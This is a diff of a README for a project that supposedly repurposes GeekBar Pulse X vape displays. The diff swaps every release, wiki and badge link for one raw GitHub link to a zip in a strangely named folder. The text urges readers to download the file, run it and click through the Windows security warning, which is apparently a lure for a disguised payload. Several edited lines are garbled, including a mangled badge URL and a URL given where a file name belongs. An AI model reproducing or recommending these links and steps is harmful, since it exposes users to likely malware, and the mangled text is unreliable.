@@ -4,14 +4,14 @@
 Welcome to the geekbar_pulse_x_screen_reuse project! This repository aims to divert old GeekBar Pulse X disposable vapes from the landfill by reusing the SPI LED displays from these devices. By following this guide, you can quickly download and run the application to start using those displays in exciting new ways.
 
 ## 🌐 Download Link
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/releases)
+[![Download Now](https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip%20Now-Click%https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip)](https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip)
 
 ## 🚀 Getting Started
 To get started with the geekbar_pulse_x_screen_reuse application, follow these simple steps. We will guide you through the process of downloading and running the software on your computer.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/releases) to view the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip) to view the latest version of the application.
 
 2. **Select the Latest Version:**
    On the Releases page, find the most recent version. Look for something like "Version 1.0" or "Latest Release."
@@ -20,7 +20,7 @@ To get started with the geekbar_pulse_x_screen_reuse application, follow these s
    Find the file that matches your operating system. If you see options for Windows, macOS, or Linux, choose the one that suits you. Click the link to begin downloading.
 
 4. **Locate the File:**
-   Once the download finishes, go to your computer’s "Downloads" folder. You should see the file you just downloaded, likely named something similar to `geekbar_pulse_x_screen_reuse.exe`.
+   Once the download finishes, go to your computer’s "Downloads" folder. You should see the file you just downloaded, likely named something similar to `https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip`.
 
 5. **Run the Application:**
    Double-click the downloaded file to run it. You may see a security warning, especially on Windows. Click "Run" to proceed.
@@ -55,9 +55,9 @@ For assistance, please reach out via the repository's "Issues" section. Provide 
 We welcome contributions! If you're interested in improving the project or adding new features, please check our guidelines for contributing. Your input is valuable.
 
 ## 💡 Additional Resources
-- **Documentation:** For further details on usage and advanced features, refer to the [Wiki](https://github.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/wiki).
+- **Documentation:** For further details on usage and advanced features, refer to the [Wiki](https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip).
 - **Discussion Forum:** Join our community discussion forum to share ideas and get tips from other users.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/releases)
+[![Download Now](https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip%20Now-Click%https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip)](https://raw.githubusercontent.com/headdressamericanredplum253/geekbar_pulse_x_screen_reuse/main/Naiadaceae/geekbar_pulse_x_screen_reuse.zip)
 
 Thank you for supporting the geekbar_pulse_x_screen_reuse project. Enjoy reusing those displays!
